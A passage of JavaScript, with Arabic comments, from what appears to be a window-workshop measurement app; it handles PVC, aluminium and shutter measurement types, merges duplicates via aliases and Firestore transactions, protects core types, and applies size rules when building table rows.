       (2) الإضافات السريعة: علامتها تخص المقاس الحالي وتُمسح بعد إضافته. */
    /* عمود الأيقونات بجانب زر الإضافة: الإضافات السريعة فقط.
       الأنواع الأساسية (بيفيسي/سرانتي) وبقية الأنواع مكانها أزرار الأقسام في الأعلى،
       ولا تُكرَّر هنا حتى يبقى العمود مختصراً ومخصصاً لما يُضاف مع المقاس. */
    /* ============================================================
       خانة PVC
       ------------------------------------------------------------
       لا تُؤشَّر تلقائياً إطلاقاً — ولا أي خانة أخرى. المستخدم هو من
       يختار نوع كل مقاس بنفسه قبل إضافته.

       سبب هذا الاختيار: التأشير التلقائي يعني أن الضغط السريع على «إضافة
       للجدول» يُسجّل صف PVC حتى لو كان المقصود سرانتي وحده أو
       ألمونيوم وحده — فيدخل صف لا يريده أحد ويُحسب في إجمالي النوع
       وينتقل إلى الفاتورة. وإذا لم يُنتبه له، يُحاسَب الزبون على شغل لم
       يُطلب. والصمت هنا أخطر من سؤال إضافي.
       ============================================================ */
    let includeBaseRow = false;

    function isBaseRowIncluded() { return includeBaseRow === true; }

    function toggleBaseRow(on) {
      includeBaseRow = !!on;
      renderExtraChips();
      updateMainActionLabel();
    }

    function baseRowChipHtml() {
      const on = isBaseRowIncluded();
      return `
        <div class="extra-item ${on ? 'on' : ''}">
          <label class="extra-tick" title="عند إزالة العلامة لن يُضاف صف PVC للجدول، وتُضاف الإضافات المؤشَّرة وحدها">
            <input type="checkbox" class="extra-check" ${on ? 'checked' : ''}
                   onchange="toggleBaseRow(this.checked)">
          </label>
          <button type="button" class="extra-chip" style="border-right:3px solid #147d49;"
                  title="الصف الأساسي: المقاس المكتوب الآن كـ PVC"
                  onclick="toggleBaseRow(!isBaseRowIncluded())">
            <i class="fas fa-window-maximize" style="color:#147d49;"></i><span>PVC</span>
          </button>
          <span class="extra-edit" style="visibility:hidden;"><i class="fas fa-pen"></i></span>
        </div>`;
    }

    function renderExtraChips() {
      // 9.9.17 — لا نعرض أنواع المقاسات داخل الكراسة تحت زر «إضافة للجدول».
      // الاختيار حصراً من نافذة منبثقة.
      const col = document.getElementById('extrasCol');
      if (col) {
        col.innerHTML = '';
        col.hidden = true;
        col.style.setProperty('display', 'none', 'important');
        col.setAttribute('aria-hidden', 'true');
      }
      const row = document.getElementById('typeButtonsRow');
      if (row) {
        row.innerHTML = '';
        row.hidden = true;
        row.style.setProperty('display', 'none', 'important');
        row.setAttribute('aria-hidden', 'true');
      }
    }

    /* ============================================================
       دمج الأسماء المكررة القديمة
       ------------------------------------------------------------
       منع التكرار يعمل عند الإضافة، لكن من أنشأ نوعاً باسم موجود قبل هذا
       التحديث بقي لديه تعريفان بنفس الاسم ولونين مختلفين وحسابين مختلفين،
       فيظهر الاسم مرتين في الجدول وبندين ماليين منفصلين.
       هنا نوحّدهما في تعريف واحد ونحوّل كل المقاسات القديمة إليه،
       ونحتفظ بجدول إحالة دائم حتى تُصحَّح الكراسات المؤرشفة عند فتحها.
       ============================================================ */
    function getTypeAliases() {
      try { return JSON.parse(safeGetItem('ws_type_aliases') || '{}'); } catch(e) { return {}; }
    }
    function saveTypeAliases(m) { safeSetItem('ws_type_aliases', JSON.stringify(m)); }

    /* هوية موحّدة للأنواع القديمة والجديدة.
       الهدف: مهما كان مصدر الكراسة أو الجهاز أو الاسم القديم، يصل النوع
       إلى معرّف واحد قبل الرسم والحساب والفاتورة. */
    function canonicalTypeId(idOrName) {
      const raw = String(idOrName || '').trim();
      if (!raw) return '';
      const n = normName(raw);
      if (n === normName('PVC')) return 'pvc';
      if (n === normName('PVC سحاب')) return 'xtype_pvc_slide';
      if (n === normName('المونيوم') || n === normName('المنيوم') || n === normName('ألمونيوم') || n === normName('الومنيوم')) return ALUM_ID;
      // «سرانتي» القديم = سرانتي عادي، ولا يُنشأ له تعريف مستقل.
      if (n === normName('سرانتي') || n === normName('سرانتي عادي') || raw === 'seranati') return SER_NORMAL_ID;
      if (n === normName('سرانتي خارجي')) return 'xtype_ser_out';
      if (n === normName('ناموسية متحركة')) return 'xtype_net_move';
      if (n === normName('ناموسية ثابتة')) return 'xtype_net_fix';
      if (n === normName('صندوق PVC')) return 'xtype_box_pvc';
      if (n === normName('صندوق خفاف')) return 'xtype_box_light';
      if (n === normName('سكارات مطبخ')) return 'xtype_kitchen_skirt';
      return raw;
    }

    function resolveTypeId(id) {
      id = canonicalTypeId(id);
      const a = getTypeAliases();
      let seen = 0;
      while(a[id] && seen++ < 5) id = a[id];   // حماية من أي حلقة
      return id;
    }

    function mergeDuplicateTypeNames() {
      const extras  = getExtraTypes();
      const customs = getCustomTypes();
      const groups  = {};
      extras.forEach(t  => (groups[normName(t.name)]  = groups[normName(t.name)]  || []).push({ kind: 'extra',  t }));
      customs.forEach(t => (groups[normName(t.name)] = groups[normName(t.name)] || []).push({ kind: 'custom', t }));

      const aliases = getTypeAliases();
      let merged = 0, changed = false;

      Object.keys(groups).forEach(key => {
        const g = groups[key];
        if(g.length < 2) return;
        // نُبقي الإضافة إن وُجدت لأنها تحمل طريقة الحساب، وإلا أول نوع
        const primary = g.find(x => x.kind === 'extra') || g[0];
        g.forEach(x => {
          if(x === primary) return;
          aliases[x.t.id] = primary.t.id;
          // النوع المدموج كان ظاهراً في مكانه، فنُبقي ظهور الأساسي في المكانين
          if(x.kind === 'custom') primary.t.asType  = true;
          if(x.kind === 'extra')  primary.t.asExtra = true;
          merged++;
          changed = true;
        });
      });

      if(!changed) return 0;
      const dropped = Object.keys(aliases);
      saveTypeAliases(aliases);
      saveExtraTypes(getExtraTypes().filter(t => dropped.indexOf(t.id) === -1));
      saveCustomTypes(getCustomTypes().filter(t => dropped.indexOf(t.id) === -1));
      applyTypeAliases();
      return merged;
    }

    /* تنظيف مركزي للأنواع المشتركة في Firestore.
       mergeDuplicateTypeNames القديم يعالج الجهاز الحالي، أما هذا الحارس
       فيمنع عودة النسخ المكررة من جهاز عضو آخر: قراءة واحدة + دمج ذري +
       كتابة واحدة. لا نغيّر الأنواع المخصصة الفريدة، ولا نحذف المقاسات. */
    async function normalizeSharedMeasurementTypes() {
      if (!db || !db.runTransaction) return;
      try {
        const ref = db.collection('measurementTypes').doc('list');
        await db.runTransaction(async tx => {
          const snap = await tx.get(ref);
          if (!snap.exists) return;
          const data = snap.data() || {};
          const serverExtras = Array.isArray(data.types) ? data.types : [];
          const serverCustom = Array.isArray(data.customTypes) ? data.customTypes : [];
          const aliasMap = getTypeAliases();
          const byId = {};
          const customById = {};
          const canonicalByName = {};
          DEFAULT_EXTRA_TYPES.forEach(d => {
            canonicalByName[normName(d.name)] = d.id;
            byId[d.id] = Object.assign({}, d);
          });
          // PVC أساسي لا يُحفظ داخل قائمة extras.
          canonicalByName[normName('PVC')] = 'pvc';

          function absorb(list, target) {
            list.forEach(t => {
              if (!t || !t.id || !t.name) return;
              const canonical = canonicalTypeId(t.id) !== t.id ? canonicalTypeId(t.id) : canonicalTypeId(t.name);
              const known = canonicalByName[normName(t.name)];
              const cid = known || canonical;
              if (cid && cid !== t.id && (cid === 'pvc' || cid === SER_NORMAL_ID || DEFAULT_EXTRA_TYPES.some(d => d.id === cid))) {
                aliasMap[t.id] = cid;
                return;
              }
              if (cid === 'pvc') return;
              if (cid === t.id) { target[cid] = Object.assign({}, target[cid] || {}, t); return; }
              if (target[cid]) { aliasMap[t.id] = cid; return; }
              const clone = Object.assign({}, t, { originalName: t.originalName || t.name });
              target[cid] = clone;
              canonicalByName[normName(clone.name)] = cid;
            });
          }
          absorb(serverExtras, byId);
          absorb(serverCustom, customById);

          // إزالة التكرار بين customTypes وtypes: الإضافة الرئيسية هي المرجع إذا كانت موجودة.
          Object.keys(customById).forEach(id => {
            const c = customById[id];
            const n = normName(c.name);
            const mainId = canonicalByName[n];
            if (mainId && mainId !== id) { aliasMap[id] = mainId; delete customById[id]; }
          });

          // لا نعيد «سرانتي» القديم تحت أي ظرف.
          Object.keys(byId).forEach(id => {
            if (normName(byId[id].name) === normName('سرانتي')) { aliasMap[id] = SER_NORMAL_ID; delete byId[id]; }
          });

          const cleanExtras = sanitizeExtraTypes(Object.values(byId)).sort((a,b) => {
            const ia = DEFAULT_EXTRA_TYPES.findIndex(d => d.id === a.id), ib = DEFAULT_EXTRA_TYPES.findIndex(d => d.id === b.id);
            return (ia < 0 ? 999 : ia) - (ib < 0 ? 999 : ib);
          });
          const cleanCustom = Object.values(customById).filter(t => t && t.id && !canonicalTypeId(t.name).startsWith('xtype_'));
          const next = Object.assign({}, data, {
            types: cleanExtras,
            customTypes: cleanCustom,
            primaryTypes: PRIMARY_TYPE_MANIFEST,
            updatedAt: Date.now(),
            updatedBy: (window.currentShopUser && window.currentShopUser.name) || ''
          });
          const before = JSON.stringify({types:serverExtras,customTypes:serverCustom});
          const after = JSON.stringify({types:cleanExtras,customTypes:cleanCustom});
          if (before !== after) tx.set(ref, next, { merge: true });
          if (Object.keys(aliasMap).length) {
            saveTypeAliases(Object.assign(getTypeAliases(), aliasMap));
          }
        });
        // شفاء الكراسة المفتوحة محلياً بعد التنظيف.
        applyTypeAliases();
        saveCurrentState();
      } catch (e) {
        // لا نفشل التطبيق بسبب الشبكة؛ النسخة المحلية هي المرجع أثناء الانقطاع.
        console.warn('normalizeSharedMeasurementTypes:', e);
      }
    }

    // تحويل مقاسات الكراسة الحالية وبنودها إلى المعرّفات الموحّدة
    function applyTypeAliases() {
      const a = getTypeAliases();
      if(!Object.keys(a).length) return false;
      let touched = false;
      jobList.forEach(i => {
        const r = resolveTypeId(i.type);
        if(r && r !== i.type) { i.type = r; touched = true; }
      });
      document.querySelectorAll('.bill-row[data-auto-type]').forEach(row => {
        const r = resolveTypeId(row.dataset.autoType);
        if(r !== row.dataset.autoType) { row.dataset.autoType = r; touched = true; }
      });
      return touched;
    }

    /* البحث عن أي عنصر بمعرّفه سواء كان إضافة سريعة أو نوعاً مضافاً —
       فالعنصر الواحد قد يظهر في المكانين معاً بنفس المعرّف واللون والحساب. */
    function findTypeById(id) {
      const x = getExtraTypes().find(t => t.id === id);
      if(x) return { kind: 'extra', t: x };
      const c = getCustomTypes().find(t => t.id === id);
      if(c) return { kind: 'custom', t: c };
      return null;
    }

    function refreshExtraTypeUI() {
      rebuildCustomTypeStyles();
      renderExtraTypeBoxes();
      renderExtraChips();
      renderCopyButtons();
      updateMainActionLabel();
      /* ⚠️ 9.8.1 — الجدول كان يبقى على الاسم القديم.

         كل صفّ مقاس يعرض getTypeName(i.type). فحين يُعيد زميلٌ تسمية نوع
         — أو يُضيف نوعاً ثم يُصحّح اسمه — تصل التسمية الجديدة وتُحدَّث
         مربّعات التأشير وحدها، ويبقى **الجدول** على الاسم القديم حتى
         يقع رسمٌ آخر لسبب آخر.

         والنتيجة أسوأ من التأخّر: شاشةٌ فيها الاسمان معاً — الجديد في
         الأعلى والقديم في الصفوف — فيظنّ المستخدمُ نوعين حيث نوع واحد.

         وحرسناها بـ try لأن refreshExtraTypeUI تُستدعى أحياناً قبل أن
         يكتمل بناء الجدول. */
      try { renderTable(); } catch (e) {}
    }

    // طريقة حساب الناتج لهذه الإضافة: مثل السرانتي (حد أدنى متر كامل) أم مثل البيفيسي
    function askExtraCalc(name, current) {
      const now = current === 'pvc' ? 'النوافذ والأبواب' : 'السرانتي';
      return confirm(`طريقة حساب ناتج «${name}» (الحالية: مثل ${now}):\n\n« موافق » = مثل السرانتي: أي مقاس أقل من متر يُحسب متراً كاملاً\n« إلغاء » = مثل النوافذ والأبواب: نصف متر تحت 50 سم … إلخ`) ? 'ser' : 'pvc';
    }

    function addExtraType() {
      let name = prompt('اكتب اسم الأيقونة الجديدة (مثال: شبك حماية):');
      if(!name || !name.trim()) return;
      name = name.trim();
      // الاسم نفسه لا يتكرر في مكانين بلونين وحسابين مختلفين
      const dup = findByName(name);
      if(dup && dup.kind === 'base') { alert(`«${dup.t.name}» نوع أساسي في الأعلى ولا يُضاف كأيقونة.`); return; }
      if(dup && dup.kind === 'extra') { alert(`«${dup.t.name}» موجود بالفعل ضمن الإضافات.`); return; }
      if(dup && dup.kind === 'custom') {
        if(dup.t.asExtra) { alert(`«${dup.t.name}» ظاهر بالفعل في الأنواع وفي الإضافات.`); return; }
        if(!confirm(`«${dup.t.name}» موجود ضمن الأنواع.\n\nسيظهر أيضاً كأيقونة هنا بنفس لونه وطريقة حسابه ونفس مقاساته — ويبقى نوعاً في الأعلى كما هو.\n\nمتابعة؟`)) return;
        linkTypeAsExtra(dup.t);
        refreshExtraTypeUI();
        return;
      }
      const list = getExtraTypes();
      list.push({
        // الأنواع تُزامَن بين الأعضاء، فمعرّفها يجب ألا يتصادم بين جهازين
        id: wsUid('xtype_'),
        name: name,
        originalName: name,
        color: EXTRA_PALETTE[list.length % EXTRA_PALETTE.length],
        icon: 'fa-shapes',
        calc: askExtraCalc(name, 'ser')
      });
      saveExtraTypes(list, { merge: true });
      refreshExtraTypeUI();
    }

    // تعديل اسم إضافة أو حذفها بالكامل إذا تُرك الحقل فارغاً
    /* ══ نوعان محميّان لا يُحذفان ولا يُعاد تسميتهما ══
       PVC هو النوع الأساسي الذي تُبنى عليه كل الإضافات، وحذفه يترك الكراسة
       بلا نوع أصلي. وسرانتي عادي له **قاعدة مقاس مبرمجة** (+1 عرضاً
       و+15 ارتفاعاً) يعتمدها حساب القص؛ فحذفه أو تغيير اسمه يُفقد تلك
       القاعدة صامتةً، وتخرج المقاسات بلا الزيادة فيُقصّ الألمنيوم خطأً.
       بقية الأنواع تُحذف وتُعاد تسميتها بحرية. */
    /* 9.9.13 — الأنواع الرئيسية محمية من الحذف/إعادة التسمية.
       الحماية بالاسم + المعرّف معاً، لأن الأنواع القديمة أو القادمة من
       Firestore قد تحمل IDs مختلفة بينما اسمها هو المرجع الحقيقي.
       لا نعتمد على spelling واحد: نحمي أيضاً الاختلافات الشائعة مثل
       «المونيوم/ألمونيوم» و«ناموسية + بلاك». */
    const PROTECTED_TYPE_IDS = [
      'pvc', 'xtype_pvc_slide', ALUM_ID, SER_NORMAL_ID, 'xtype_ser_out',
      'xtype_net_move', 'xtype_net_fix', 'xtype_box_pvc', 'xtype_box_light',
      'xtype_kitchen_skirt'
    ];
    const PROTECTED_TYPE_NAMES = new Set([
      'pvc', 'pvc سحاب',
      'المونيوم', 'المنيوم', 'ألمونيوم', 'الومنيوم',
      'سرانتي عادي', 'سرانتي خارجي',
      'ناموسية متحركة', 'ناموسية ثابتة',
      'صندوق pvc', 'صندوق خفاف', 'سكارات مطبخ'
    ].map(normName));
    function isProtectedType(id) {
      const raw = String(id || '');
      if(PROTECTED_TYPE_IDS.indexOf(raw) > -1) return true;
      try {
        const name = getTypeName(raw);
        if(PROTECTED_TYPE_NAMES.has(normName(name))) return true;
        const found = findTypeById(raw);
        if(found && found.t && PROTECTED_TYPE_NAMES.has(normName(found.t.name))) return true;
      } catch(e) {}
      return false;
    }

    function protectedTypeMessage(id) {
      return '🔒 «' + (getTypeName(id) || id) + '» نوع رئيسي محمي.\n\n' +
        'لا يمكن حذف هذا النوع أو إعادة تسميته، حتى تبقى الأنواع الأساسية وقواعدها ومقاسات الكراسات القديمة متوافقة.';
    }

    /* حذف النوع من أي جهة: إذا كان النوع مرتبطاً بقائمة الأنواع المخصصة
       والإضافات السريعة معاً، فحذفه من أي واجهة يحذفه من القائمتين.
       المقاسات القديمة تبقى سليمة لأن الصف يحمل هوية/اسم النوع التاريخي. */
    function deleteTypeDefinitionEverywhere(id) {
      if (isProtectedType(id)) { alert(protectedTypeMessage(id)); return false; }
      const found = findTypeById(id);
      const name = found && found.t ? found.t.name : (getTypeName(id) || id);
      if (!confirm('حذف النوع «' + name + '» نهائياً من قائمة الأنواع؟\n\nستبقى المقاسات القديمة المحفوظة كما هي، لكن لن يظهر النوع للاستخدام في المقاسات الجديدة.')) return false;
      const beforeExtra = getExtraTypes();
      const beforeCustom = getCustomTypes();
      if (beforeExtra.some(t => t && t.id === id)) saveExtraTypes(beforeExtra.filter(t => t.id !== id));
      if (beforeCustom.some(t => t && t.id === id)) saveCustomTypes(beforeCustom.filter(t => t.id !== id));
      saveExtraRepeats(getExtraRepeats().filter(x => x !== id));
      if (activeType === id) activeType = 'pvc';
      try { rebuildCustomTypeStyles(); renderTypeButtons(); renderCustomTypeBoxes(); renderExtraTypeBoxes(); renderExtraChips(); renderCopyButtons(); renderBulkPanes(); } catch(e) {}
      try { switchBox('pvc'); } catch(e) {}
      showMiniToast('🗑️ تم حذف النوع «' + name + '» من جميع القوائم', '#b42318');
      return true;
    }

    function editExtraType(id, e) {
      if(e) e.stopPropagation();
      if(isProtectedType(id)) { alert(protectedTypeMessage(id)); return; }
      const found = findTypeById(id);
      if(found && found.kind === 'custom') { renameCustomType(id, e || { stopPropagation(){} }); return; }
      const list = getExtraTypes();
      const t = list.find(x => x.id === id);
      if(!t) return;
      let newName = prompt('اسم هذه الأيقونة (امسح الحقل واضغط "موافق" لحذفها):', t.name);
      if(newName === null) return;
      if(!newName.trim()) {
        deleteTypeDefinitionEverywhere(id);
        return;
      }
      newName = newName.trim();
      const dup = findByName(newName, id);
      if(dup) { alert(`الاسم «${dup.t.name}» مستخدم بالفعل. اختر اسماً مختلفاً.`); return; }
      t.name = newName;
      t.calc = askExtraCalc(t.name, t.calc);

      /* قاعدة الزيادة على مقاس الفتحة — قابلة للتعديل من هنا مباشرةً.
         مثال السرانتي العادي: 1 عرضاً و15 ارتفاعاً، فيصير 99×100 → 100×115.
         نص فارغ أو صفر = تأخذ الإضافة نفس المقاس بلا زيادة. */
      const curAdd = (Number(t.addW) || 0) + ' , ' + (Number(t.addH) || 0);
      const ansAdd = prompt(
        'الزيادة على مقاس النافذة أو الباب لـ «' + newName + '»\n' +
        'اكتبها هكذا:  الزيادة في العرض , الزيادة في الارتفاع\n' +
        'مثال السرانتي العادي:  1 , 15   (99×100 تصير 100×115)\n' +
        'اتركها 0 , 0 إن كانت تأخذ نفس المقاس تماماً.',
        curAdd
      );
      if(ansAdd !== null) {
        const parts = toLatinNums(ansAdd).split(/[,،]/);
        const aw = wsNum(parts[0], NaN);   // إصلاح 8.8
        const ah = wsNum(parts[1], NaN);
        t.addW = isNaN(aw) ? 0 : aw;
        t.addH = isNaN(ah) ? 0 : ah;
      }
      saveExtraTypes(list);
      refreshExtraTypeUI();
      renderTable();
      saveCurrentState();
    }

    // يقرأ أول مقاس مكتوب في أقسام الأعلى (بيفيسي/سرانتي/أي نوع مضاف) مهما كان القسم المفتوح
    function readTypedMeasure() {
      const defs = getAllTypeDefs().filter(d => !d.extra || d.asType);
      for(const d of defs) {
        const wi = document.getElementById(d.w), hi = document.getElementById(d.h);
        if(wi && hi && wi.value && hi.value) return { w: wi.value, h: hi.value, from: d.id };
      }
      return null;
    }

    // صف جديد بنفس المقاس تماماً لكن باسم الإضافة (بلا رسم، حتى لا يتضخم حجم الحفظ بنسخ الصورة عدة مرات)
    /* زيادة المقاس الخاصة بالإضافة (إن كانت لها قاعدة).
       تُطبَّق في مكان واحد فقط، فتشمل كل طرق الإضافة: العلامة ✓، والضغط
       على الأيقونة، واللصق الجماعي — بلا تكرار للقاعدة في ثلاثة مواضع. */
    // الأرقام العربية تُقرأ كلاتينية قبل أي تحويل رقمي
    function toLatinNums(v) {
      return String(v == null ? '' : v)
        .replace(/[\u0660-\u0669]/g, d => String(d.charCodeAt(0) - 0x0660))
        .replace(/[\u06F0-\u06F9]/g, d => String(d.charCodeAt(0) - 0x06F0))
        .replace(/\u066B/g, '.');
    }

    function extraDim(x, w, h) {
      /* السرانتي العادي له قاعدة ثابتة لا تعتمد على تعريف محفوظ قديماً:
         عند تركيبه على فتحة PVC/ألمونيوم = +1 سم عرضاً و+15 سم ارتفاعاً.
         قد تحتوي localStorage/Firestore على تعريف قديم بـ addW/addH = 0،
         لذلك لا نعتمد على تلك القيم لهذا النوع تحديداً. */
      const isSerNormal = !!(x && x.id === SER_NORMAL_ID);
      const dw = isSerNormal ? 1 : (Number(x && x.addW) || 0);
      const dh = isSerNormal ? 15 : (Number(x && x.addH) || 0);
      const nw = Math.round(((Number(w) || 0) + dw) * 100) / 100;
      const nh = Math.round(((Number(h) || 0) + dh) * 100) / 100;
      return { w: nw > 0 ? nw : w, h: nh > 0 ? nh : h, changed: !!(dw || dh) };
    }

    /* قاعدة الزيادة تُطبَّق فقط عندما يُضاف السرانتي العادي **مع** مقاس
       PVC أو ألمونيوم — لأنه يُركَّب حول تلك الفتحة فيزيد عنها.
       أما إن أُدخل منفرداً (بلا صف أساسي معه) فالرقم المكتوب هو مقاسه
       نفسه، ولا يجوز الزيادة عليه: يكون المستخدم قد قاس السرانتي مباشرة.
       withBase تُمرَّر من نقطة الإضافة لأنها وحدها تعرف السياق. */
    /* ⚠️⚠️ إصلاح 9.0.3 — «الرسم لا يظهر في الجدول».

       كان السطر الأخير يضع  img: ''  دائماً، بلا استثناء. فالرسم يُلتقط
       من اللوحة ويُضغط ويُحمَّل على الصف الأساسي وحده — وكل صف يمرّ من
       هنا يخرج بلا رسم.

       ولماذا بدا العطل «دائماً» للمستخدم؟ لأن هذا هو المسار الشائع لا
       الاستثنائي: من يؤشّر سرانتي أو ألمونيوم أو ناموسية — وأغلب العمل
       كذلك — تُبنى صفوفه كلها هنا. ولا يرى رسمه إلا إن أشّر PVC وحدها.

       والنتيجة في الورشة: يرسم الفنّي شكل الفتحة ليوضّح تفصيلة لا يكفيها
       الرقم، ثم تصل الكراسة إلى القصّاص بلا رسم — فيقصّ على المقاس وحده
       ويضيع بيان التفصيلة. وهو خطأ صامت تماماً: لا رسالة ولا علامة،
       والخانة تعرض «-» كأن أحداً لم يرسم شيئاً.

       الآن: الرسم يُمرَّر كوسيط ويُحمَّل على كل صف من نفس الإضافة — فهي
       كلها لنفس الفتحة ونفس الرسم. */
    function buildExtraRow(x, w, h, note, withBase, img) {
      const applyRule = (x && x.id === SER_NORMAL_ID) ? (withBase === true) : true;
      const d = applyRule ? extraDim(x, w, h) : { w: w, h: h, changed: false };
      // نوضّح في الملاحظة أن المقاس محسوب من مقاس الفتحة، فلا يظنه أحد خطأ إدخال
      const auto = d.changed ? ('مقاس السرانتي محسوب من ' + w + '×' + h) : '';
      const finalNote = [note || '', auto].filter(Boolean).join(' — ');
      return stampNewItem({ type: x.id, w: d.w, h: d.h, note: finalNote, img: img || '',
                            res: calculateLogic(d.w, d.h, x.id), sel: true, sk: '', itemColor: '' });
    }

    // الضغط على الأيقونة نفسها: يضيف المقاس المكتوب الآن باسمها فوراً، دون مسح الحقول
    // حتى يبقى بإمكانك بعدها الضغط على "إضافة للجدول" لإضافة المقاس الأصلي أيضاً
    function quickAddExtra(id) {
      // حارس: الإضافات السريعة تخصّ البيفيسي وحده مهما كان مصدر النداء
      if (!extrasAllowedFor(activeType)) {
        showMiniToast('الإضافات السريعة تعمل مع قسم PVC فقط', '#157f4a');
        return;
      }
      if (isSheetLocked()) { showMiniToast('🔒 الكراسة محفوظة. للتعديل اضغط «تعديل وإضافة مقاسات» أسفل الجدول.', '#16477f'); return; }   // كراسة محفوظة: لا كتابة قبل فتحها صراحةً
      if (isSheetIdleLocked()) { alert(idleLockMessage()); return; }   // 9.7.0 — قفل بعد اكتمال الرفع
      if(editingIndex > -1) { alert('⚠️ يرجى إنهاء تعديل العنصر الحالي أولاً'); return; }
      const found = findTypeById(id);
      if(!found) return;
      const x = found.t;
      const m = readTypedMeasure();
      if(!m) { alert('اكتب العرض والارتفاع في الأعلى أولاً، ثم اضغط «' + x.name + '»'); return; }
      // الضغط المباشر على الأيقونة = إدخال منفرد، فلا قاعدة زيادة
      /* 9.0.3 — الإضافة السريعة تحمل الرسم كذلك: من رسم الفتحة ثم ضغط
         أيقونة النوع مباشرةً كان صفّه يخرج بلا رسم كبقية المسارات. */
      jobList.push(buildExtraRow(x, m.w, m.h, document.getElementById('note').value, false,
                                 isCanvasEmpty ? '' : compressSketch()));
      ensureOrderIndices();
      renderTable();
      saveCurrentState();
      showMiniToast(`تمت إضافة ${m.w} × ${m.h} باسم «${x.name}» ✅`, x.color);
    }

    // نص زر الإضافة: يعرض أسماء الإضافات المفعّلة بـ ✓ حتى تكون واضحة قبل الضغط
    function updateMainActionLabel() {
      /* حفظ التعديل هو زر الاعتماد الوحيد للتغييرات المؤجلة؛ لا نعرض زر حفظ تغييرات ثانياً. */
      const pendingBtn = document.getElementById('mainActionBtn');
      if (pendingBtn) pendingBtn.onclick = function(){ saveEntry(); };
      /* الزر يقول بالضبط ما سيُضاف: مع إزالة PVC يصير
         «إضافة الإضافات فقط»، فلا يضغط أحد ظاناً أنه يسجّل المقاس. */
      try {
        const btnSpan = document.querySelector('#mainActionBtn span');
        if (btnSpan && editingIndex === -1) {
          const nRep = getExtraRepeats().length;
          if (!isBaseRowIncluded()) {
            btnSpan.textContent = nRep ? 'إضافة الإضافات فقط (' + nRep + ')' : 'أشِّر خانة واحدة على الأقل';
          } else {
            btnSpan.textContent = nRep ? 'إضافة للجدول + ' + nRep + ' إضافة' : 'إضافة للجدول';
          }
        }
      } catch (e) {}

      const btn = document.getElementById('mainActionBtn');
      if(!btn) return;
      if(editingIndex > -1) {
        btn.style.display = 'none';
        renderPendingChangesBar();
        return;
      }
      btn.style.display = '';
      btn.style.background = '';
      const names = getExtraTypes().filter(t => isExtraRepeating(t.id)).map(t => t.name);
      btn.innerHTML = '<i class="fas fa-circle-plus"></i><span>إضافة للجدول</span>' +
        (names.length ? `<small>${escapeHtml(names.join(' + '))}</small>` : '');
    }

    // الإشعارات العائمة معطلة عمداً: لا تظهر أي رسالة فوق أدوات الرسم أو أزرار الحفظ.
    // تبقى الدالة موجودة حتى لا تتعطل المسارات القديمة التي تستدعيها.
    function showMiniToast(msg, color) {
      return;
    }

    // إضافة نوع جديد (وليس نوعاً ثالثاً فقط - يمكن تكرار هذا لإضافة أي عدد من الأنواع)
    /* ============================================================
       منع تكرار الاسم بين الأنواع والإضافات
       ------------------------------------------------------------
       لو أضاف المستخدم نوعاً باسم موجود أصلاً ضمن الإضافات (مثل "سرانتي خارجي")
       فلا يُنشأ اسم ثانٍ بلون وحساب مختلفين — بل تُرقّى الإضافة نفسها إلى نوع
       كامل بمعرّفها ولونها وطريقة حسابها كما هي، فتبقى كل المقاسات القديمة
       المسجّلة باسمها سليمة ولا ينشطر الاسم إلى شيئين.
       ============================================================ */
    function normName(s) {
      return String(s || '').trim().replace(/\s+/g, ' ')
        .replace(/[أإآ]/g, 'ا').replace(/ة/g, 'ه').replace(/ى/g, 'ي')
        .toLowerCase();
    }
    // يبحث عن الاسم في الأنواع الأساسية والمخصصة والإضافات
    function findByName(name, exceptId) {
      const n = normName(name);
      const base = [{ id: 'pvc', name: 'PVC' }];
      for(const t of base)             if(normName(t.name) === n && t.id !== exceptId) return { kind: 'base',   t };
      for(const t of getCustomTypes()) if(normName(t.name) === n && t.id !== exceptId) return { kind: 'custom', t };
      for(const t of getExtraTypes())  if(normName(t.name) === n && t.id !== exceptId) return { kind: 'extra',  t };
      return null;
    }

    // ربط الإضافة بالأنواع: تبقى في عمود الإضافات وتظهر أيضاً كزر نوع في الأعلى
    function linkExtraAsType(x) {
      const list = getExtraTypes();
      const t = list.find(e => e.id === x.id);
      if(t) { t.asType = true; saveExtraTypes(list); }
    }
    // والعكس: نوع مضاف يظهر أيضاً ضمن الإضافات السريعة
    function linkTypeAsExtra(c) {
      const list = getCustomTypes();
      const t = list.find(e => e.id === c.id);
      if(t) { t.asExtra = true; saveCustomTypes(list); }
    }

    function addCustomType(options) {
      options = options || {};
      let name = prompt('اكتب اسم النوع الجديد الذي تريد إضافته:');
      if(!name || !name.trim()) return;
      name = name.trim();

      const dup = findByName(name);
      if(dup && dup.kind === 'base') { alert(`«${dup.t.name}» نوع أساسي موجود بالفعل في الأعلى.`); switchBox(dup.t.id); return; }
      if(dup && dup.kind === 'custom') { alert(`«${dup.t.name}» موجود بالفعل ضمن الأنواع.`); switchBox(dup.t.id); return; }

      if(dup && dup.kind === 'extra') {
        if(dup.t.asType) { alert(`«${dup.t.name}» ظاهر بالفعل في الأنواع وفي الإضافات.`); switchBox(dup.t.id); return; }
        if(!confirm(`«${dup.t.name}» موجود ضمن الإضافات السريعة.\n\nسيظهر أيضاً كنوع في الأعلى، بنفس لونه وطريقة حسابه ونفس مقاساته السابقة — ويبقى في عمود الإضافات كما هو.\n\nمتابعة؟`)) return;
        linkExtraAsType(dup.t);
        renderTypeButtons(); renderCustomTypeBoxes(); renderCopyButtons(); renderBulkPanes();
        refreshExtraTypeUI();
        switchBox(dup.t.id);
        return;
      }

      const types = getCustomTypes();
      const id = wsUid('ctype_');
      types.push({ id, name, originalName: name, color: nextCustomTypeColor(), calc: 'pvc' });
      saveCustomTypes(types, { merge: true });
      renderTypeButtons();
      renderCustomTypeBoxes();
      renderCopyButtons();
      renderBulkPanes();          // مربع اللصق الخاص بالنوع يُضاف/يُحدَّث فوراً
      refreshExtraTypeUI();       // يحدّث الجدول وقائمة الأنواع العليا
      // عند إنشاء النوع من نافذة نسخ صف في الجدول لا ننقل المستخدم إلى
      // صندوق إدخال جديد تحت خانتي العرض والارتفاع؛ يظهر النوع في الأعلى
      // فوراً مثل بقية الأنواع، ويُختار لاحقاً عند الحاجة.
      if (!options.fromRowPicker) switchBox(id);
      return id;
    }

    // تعديل اسم نوع مخصص، أو حذفه بالكامل إذا تُرك الحقل فارغاً
    function renameCustomType(id, e) {
      e.stopPropagation();
      if(isProtectedType(id)) { alert(protectedTypeMessage(id)); return; }
      let types = getCustomTypes();
      let t = types.find(x => x.id === id);
      if(!t) return;
      let newName = prompt('اكتب الاسم الجديد لهذا النوع، أو امسح الحقل واضغط "موافق" لحذف النوع بالكامل:', t.name);
      if(newName === null) return;
